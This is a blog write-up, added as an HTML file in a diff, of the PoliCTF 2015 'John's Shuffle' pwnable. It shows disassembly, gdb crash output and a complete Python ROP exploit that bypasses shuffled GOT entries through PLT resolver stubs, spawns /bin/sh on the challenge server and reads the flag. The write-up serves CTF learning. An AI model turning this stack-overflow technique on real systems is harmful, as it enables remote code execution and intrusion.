@@ -1,0 +1,514 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>PoliCTF 2015 - John&#8217;s Shuffle - staring into /dev/null</title>
+  <meta name="author" content="barrebas">
+
+  
+  <meta name="description" content="John&rsquo;s Shuffle was a 350 point pwnable for PoliCTF 2015. Here&rsquo;s how I cracked it! Again, it&rsquo;s a 32 bit ELF binary. Running it &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-shuffle">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">staring into /dev/null</a></h1>
+  
+    <h2>barrebas</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:barrebas.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">PoliCTF 2015 - John&#8217;s Shuffle</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-07-12T17:06:29+02:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:06 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>John&rsquo;s Shuffle was a 350 point pwnable for PoliCTF 2015. Here&rsquo;s how I cracked it!</p>
+
+<!--more-->
+
+
+<p>Again, it&rsquo;s a 32 bit ELF binary. Running it yields the following:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/polictf/johns-shuffle<span class="nv">$ </span>./johns-shuffle
+</span><span class='line'>It all began as a mistake..
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>It all began as a mistake..
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>It all began as a mistake..
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Not very useful. The disassembly provided some hints, for it had functions like <code>shuffle</code>, <code>unshuffle</code> and <code>bubblesort</code>. The program kicks off by clearing a lot of stack space and calling <code>unshuffle</code>. Then, it asks for user input, maximum size 0x44 bytes. I decided to enter 0x44 * <code>A</code> (what else?).</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>... clear stack space ...
+</span><span class='line'> 8048f30: call   8048df0 &lt;unshuffle&gt;
+</span><span class='line'> 8048f35: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x804b078
+</span><span class='line'> 8048f3c: call   <span class="m">8048710</span> &lt;puts@plt&gt;
+</span><span class='line'> 8048f41: mov    eax,ds:0x804b0c0
+</span><span class='line'> 8048f46: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+</span><span class='line'> 8048f49: call   80486c0 &lt;fflush@plt&gt;
+</span><span class='line'> 8048f4e: mov    eax,ds:0x804b0a0
+</span><span class='line'> 8048f53: mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,eax
+</span><span class='line'> 8048f57: mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x44
+</span><span class='line'> 8048f5f: lea    eax,<span class="o">[</span>esp+0x2c<span class="o">]</span>
+</span><span class='line'> 8048f63: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+</span><span class='line'> 8048f66: call   80486e0 &lt;fgets@plt&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>When runnning the <code>shuffle</code> function, the program executes <code>system()</code>, which spawns <code>/bin/dash</code> on my system, effectively stopping me from debugging it in <code>gdb</code>. I patched system in gdb so it would return immediately and I could trace the program. Turns out <code>shuffle</code> takes the GOT entries, all the function pointers, and shuffles them around. <code>unshuffle</code> negates this operation. After the second time I entered 0x44 A&rsquo;s, the program crashed with control over EIP and EBP:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>start
+</span><span class='line'>Temporary breakpoint 2, 0x08048ec2 in main <span class="o">()</span>
+</span><span class='line'>gdb-peda<span class="nv">$ </span>p system
+</span><span class='line'><span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7e9ac30 &lt;system&gt;
+</span><span class='line'>gdb-peda<span class="nv">$ </span><span class="nb">set</span> *0xf7e9ac30<span class="o">=</span>0xc3
+</span><span class='line'>gdb-peda<span class="nv">$ </span>c
+</span><span class='line'>It all began as a mistake..
+</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span><span class='line'>
+</span><span class='line'>It all began as a mistake..
+</span><span class='line'>
+</span><span class='line'>It all began as a mistake..
+</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
+</span><span class='line'>EAX: 0x0
+</span><span class='line'>EBX: 0xf7fbeff4 --&gt; 0x15fd7c
+</span><span class='line'>ECX: 0x4
+</span><span class='line'>EDX: 0x80487a6 <span class="o">(</span>&lt;difftime@plt+6&gt;:    push   0x88<span class="o">)</span>
+</span><span class='line'>ESI: 0x0
+</span><span class='line'>EDI: 0x0
+</span><span class='line'>EBP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
+</span><span class='line'>ESP: 0xffffd5c0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">31</span> <span class="nb">times</span>&gt;<span class="o">)</span>
+</span><span class='line'>EIP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
+</span><span class='line'>EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
+</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0x41414141
+</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
+</span><span class='line'>0000<span class="p">|</span> 0xffffd5c0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">31</span> <span class="nb">times</span>&gt;<span class="o">)</span>
+</span><span class='line'>0004<span class="p">|</span> 0xffffd5c4 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">27</span> <span class="nb">times</span>&gt;<span class="o">)</span>
+</span><span class='line'>0008<span class="p">|</span> 0xffffd5c8 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">23</span> <span class="nb">times</span>&gt;<span class="o">)</span>
+</span><span class='line'>0012<span class="p">|</span> 0xffffd5cc <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">19</span> <span class="nb">times</span>&gt;<span class="o">)</span>
+</span><span class='line'>0016<span class="p">|</span> 0xffffd5d0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">15</span> <span class="nb">times</span>&gt;<span class="o">)</span>
+</span><span class='line'>0020<span class="p">|</span> 0xffffd5d4 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">11</span> <span class="nb">times</span>&gt;<span class="o">)</span>
+</span><span class='line'>0024<span class="p">|</span> 0xffffd5d8 <span class="o">(</span><span class="s2">&quot;AAAAAAA&quot;</span><span class="o">)</span>
+</span><span class='line'>0028<span class="p">|</span> 0xffffd5dc --&gt; 0x414141 <span class="o">(</span><span class="s1">&#39;AAA&#39;</span><span class="o">)</span>
+</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
+</span><span class='line'>Legend: code, data, rodata, value
+</span><span class='line'>Stopped reason: SIGSEGV
+</span><span class='line'>0x41414141 in ?? <span class="o">()</span>
+</span><span class='line'>gdb-peda<span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Cool, easy control over EIP. However, at this point, we cannot rely on the GOT entries, because they are still shuffled! We can&rsquo;t just ret2system. I spent some time trying to return to <code>unshuffle</code>, but kept losing control of the program execution.</p>
+
+<p>But let&rsquo;s take a step back here. Linux ELF binaries employ something called &ldquo;lazy linking&rdquo;. When a binary is started, the symbols are not resolved yet. Only when a function is called for the first time will the function address be resolved. The GOT entry will be pointing to this look up code (memcpy as example):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>080486d0 &lt;memcpy@plt&gt;:
+</span><span class='line'> 80486d0: ff <span class="m">25</span> 1c b0 <span class="m">04</span> <span class="m">08</span>      jmp    DWORD PTR ds:0x804b01c
+</span><span class='line'> 80486d6: <span class="m">68</span> <span class="m">20</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   0x20
+</span><span class='line'> 80486db: e9 a0 ff ff ff          jmp    <span class="m">8048680</span> &lt;_init+0x2c&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>When called for the first time, <code>0x804b01c</code> will be pointing to <code>0x80486d6</code>, which will kick off the function resolver. So instead of using <code>0x80486d0</code> to do a memcpy, I&rsquo;d just use <code>0x80486d6</code>. This bypasses the mess that <code>shuffle</code> made!</p>
+
+<p>With all this in hand, I wrote an exploit and the corresponding rop chain (well&hellip; more like ret2resolve ;)).</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">time</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
+</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
+</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
+</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;shuffle.polictf.it&#39;</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;mistake..&#39;</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">rop</span> <span class="o">=</span> <span class="s">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
+</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048696</span><span class="p">)</span>  <span class="c"># resolve -&gt; read (so we can read in `/bin/sh`)</span>
+</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804901d</span><span class="p">)</span> <span class="c"># pppr</span>
+</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>         <span class="c"># stdin</span>
+</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804b130</span><span class="p">)</span> <span class="c"># free mem area</span>
+</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048726</span><span class="p">)</span> <span class="c"># resolve -&gt; system</span>
+</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048746</span><span class="p">)</span> <span class="c"># resolve -&gt; exit (makes rasta_mouse happy!)</span>
+</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804b130</span><span class="p">)</span> <span class="c"># arg for system; will contain /bin/sh in a few moments</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;mistake..&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;mistake..&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;/bin/sh&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
+</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/polictf/johns-shuffle<span class="nv">$ </span>python poc.py
+</span><span class='line'>
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>ctf<span class="o">)</span>
+</span><span class='line'>cat /home/ctf/*
+</span><span class='line'>flag<span class="o">{</span>rand0mizing_things_with_l0ve<span class="o">}</span>
+</span><span class='line'>cat: /home/ctf/johnshuffle: Permission denied
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Easy peasy! The flag was <code>flag{rand0mizing_things_with_l0ve}</code>. Nice!</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-07-12T17:06:29+02:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:06 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/pwnable/'>pwnable</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-shuffle/" data-via="barrebas" data-counturl="http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-shuffle/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/07/12/polictf-2015-johns-library/" title="Previous Post: PoliCTF 2015 - John's Library">&laquo; PoliCTF 2015 - John&#8217;s Library</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/07/12/polictf-2015-johns-shuffle/">PoliCTF 2015 - John&#8217;s Shuffle</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/12/polictf-2015-johns-library/">PoliCTF 2015 - John&#8217;s Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/12/polictf-2015-hanoi-as-a-service/">PoliCTF 2015 - Hanoi as a Service</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/12/polictf-2015-crack-me-if-you-can/">PoliCTF 2015 - Crack Me if You Can</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/12/polictf-2015-john-the-dropper/">PoliCTF 2015 - John the Dropper</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - barrebas -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'barrebas';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-shuffle/';
+        var disqus_url = 'http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-shuffle/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
